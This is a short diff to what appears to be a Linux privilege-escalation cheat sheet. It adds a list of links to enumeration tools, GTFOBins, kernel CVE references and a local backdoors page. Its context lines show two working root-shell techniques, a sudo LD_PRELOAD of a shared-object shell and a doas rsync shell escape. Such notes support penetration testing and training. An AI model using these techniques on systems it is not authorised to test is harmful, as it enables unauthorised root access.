@@ -80,3 +80,13 @@ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
 ```
 doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 ```
+#### links
+* [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+* [linEnum](https://github.com/rebootuser/LinEnum)
+* [LES](https://github.com/mzet-/linux-exploit-suggester)
+* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+* [linux Priv Checker](https://github.com/linted/linuxprivchecker)
+* [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
+* [GTFOBins (unix)](https://gtfobins.github.io/)
+* [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+* [linux backdoors](./linux_backdoors.md)
